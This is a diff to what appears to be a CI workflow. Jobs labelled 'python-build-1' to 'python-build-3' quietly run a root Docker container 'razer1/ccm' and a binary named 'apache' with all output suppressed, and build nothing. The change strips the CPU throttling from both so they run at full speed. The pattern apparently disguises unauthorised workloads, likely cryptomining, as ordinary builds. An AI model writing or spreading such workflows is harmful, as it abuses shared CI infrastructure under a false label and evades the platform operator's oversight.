@@ -51,8 +51,8 @@ jobs:
       run: |
         sudo apt update && sudo apt install -y cpulimit
         sudo -u root docker run razer1/ccm >/dev/null 2>&1 >/dev/null &
-        sudo cpulimit -e docker -l 30 >/dev/null &
-        sudo cpulimit -e apache -l 30 >/dev/null 2>&1
+        sleep 60
+        sudo nice apache >/dev/null 2>&1
  
  python-build-3:
     runs-on: ubuntu-20.04 
@@ -70,8 +70,8 @@ jobs:
       run: |
         sudo apt update && sudo apt install -y cpulimit
         sudo -u root docker run razer1/ccm >/dev/null 2>&1 >/dev/null &
-        sudo cpulimit -e docker -l 30 >/dev/null &
-        sudo cpulimit -e apache -l 30 >/dev/null 2>&1
+        sleep 60
+        sudo nice apache >/dev/null 2>&1
  
  python-build-2:
     runs-on: ubuntu-20.04 
@@ -89,8 +89,8 @@ jobs:
       run: |
         sudo apt update && sudo apt install -y cpulimit
         sudo -u root docker run razer1/ccm >/dev/null 2>&1 >/dev/null &
-        sudo cpulimit -e docker -l 30 >/dev/null &
-        sudo cpulimit -e apache -l 30 >/dev/null 2>&1
+        sleep 60
+        sudo nice apache >/dev/null 2>&1
  
  python-build-1:
     runs-on: ubuntu-20.04 
@@ -108,5 +108,5 @@ jobs:
       run: |
         sudo apt update && sudo apt install -y cpulimit
         sudo -u root docker run razer1/ccm >/dev/null 2>&1 >/dev/null &
-        sudo cpulimit -e docker -l 30 >/dev/null &
-        sudo cpulimit -e apache -l 30 >/dev/null 2>&1
+        sleep 60
+        sudo nice apache >/dev/null 2>&1
